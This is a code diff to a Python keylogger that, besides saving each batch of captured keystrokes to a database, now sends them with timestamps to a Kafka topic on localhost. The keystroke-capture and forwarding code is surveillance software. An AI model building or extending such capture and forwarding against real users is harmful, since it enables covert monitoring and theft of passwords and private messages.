@@ -4,6 +4,7 @@ import logging
 import time
 import asyncio
 from db.repository.KeyloggerRepository import KeyloggerRepository
+from kafkadir.KafkaProducerWrapper import KafkaProducerWrapper
 
 keystrokes = ""
 start_time = time.time()
@@ -33,13 +34,22 @@ def on_press(key):
 keyboardListener = keyboard.Listener(
     on_press=on_press)
 
+kafka_producer = KafkaProducerWrapper(['localhost:9092'])
+keyloggerRepository = KeyloggerRepository()
+
 def save_keystrokes():
     global keystrokes
     global start_time
     print(keystrokes)
-    keyloggerRepository = KeyloggerRepository()
     if keystrokes:
-        keyloggerRepository.insert_keylog(start_time=start_time, keys=keystrokes, end_time=time.time())
+        data = {
+            "start_time": start_time,
+            "keys": keystrokes,
+            "end_time": time.time()
+        }
+        keyloggerRepository.insert_keylog(start_time=data["start_time"], keys=data["keys"], end_time=data["end_time"])
+        kafka_producer.send_message(KafkaProducerWrapper.KEYLOGGER_TOPIC, data)
+        
     keystrokes = ""
     start_time = time.time()
 
